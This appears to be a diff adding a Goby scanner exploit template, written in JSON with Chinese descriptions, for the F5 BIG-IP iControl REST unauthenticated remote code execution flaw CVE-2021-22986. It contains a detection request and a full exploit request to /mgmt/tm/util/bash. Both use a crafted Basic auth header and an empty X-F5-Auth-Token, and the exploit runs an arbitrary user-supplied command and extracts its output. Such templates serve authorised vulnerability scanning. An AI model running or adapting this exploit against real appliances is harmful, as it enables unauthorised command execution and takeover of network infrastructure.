@@ -1,0 +1,85 @@
+{
+      "Name": "F5 BIG-IP代码执行漏洞（CVE-2021-22986）exp",
+      "Level": "3",
+      "Tags": [
+            "RCE"
+      ],
+      "GobyQuery": "product=\"F5-BIGIP\"",
+      "Description": "F5 BIG-IP/BIG-IQ iControl REST 未授权远程代码执行漏洞中，未经身份验证的攻击者可通过iControl REST接口，构造恶意请求，执行任意系统命令。",
+      "Product": "F5 Big-IP",
+      "Homepage": "",
+      "Author": "k3vi_07@icloud.com",
+      "Impact": "<p><span style=\"font-size: 15px;\">F5 BIG-IP/BIG-IQ iControl REST 未授权远程代码执行漏洞中，未经身份验证的攻击者可通过iControl REST接口，构造恶意请求，执行任意系统命令。</span><br></p>",
+      "Recommandation": "<p>undefined</p>",
+      "References": [
+            "https://www.freebuf.com/vuls/268254.html"
+      ],
+      "HasExp": true,
+      "ExpParams":[
+            {
+                  "name":"cmd",
+                  "type":"input",
+                  "value":"whoami",
+                  "show":""
+            }
+      ],
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/mgmt/tm/util/bash",
+                        "follow_redirect": true,
+                        "header": {
+                              "Authorization": "Basic YWRtaW46QVNhc1M=",
+                              "X-F5-Auth-Token": ""
+                        },
+                        "data_type": "text",
+                        "data": "{\"command\":\"run\",\"utilCmdArgs\":\"-c 'echo tsxts|base64'\"}"
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "dHN4dHMK",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+      "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/mgmt/tm/util/bash",
+                        "follow_redirect": false,
+                        "header": {
+                              "Authorization": "Basic YWRtaW46QVNhc1M=",
+                              "X-F5-Auth-Token": ""
+                        },
+                        "data_type": "text",
+                        "data": "{\"command\":\"run\",\"utilCmdArgs\":\"-c {{{cmd}}}\"}"
+                  },
+                  
+                  "SetVariable": [
+                        "output|lastbody|regex|commandResult\".\"(.*)\"}"
+                  ]
+            }
+      ],
+      "PostTime": "2021-04-01 16:51:54",
+      "GobyVersion": "1.8.255"
+}
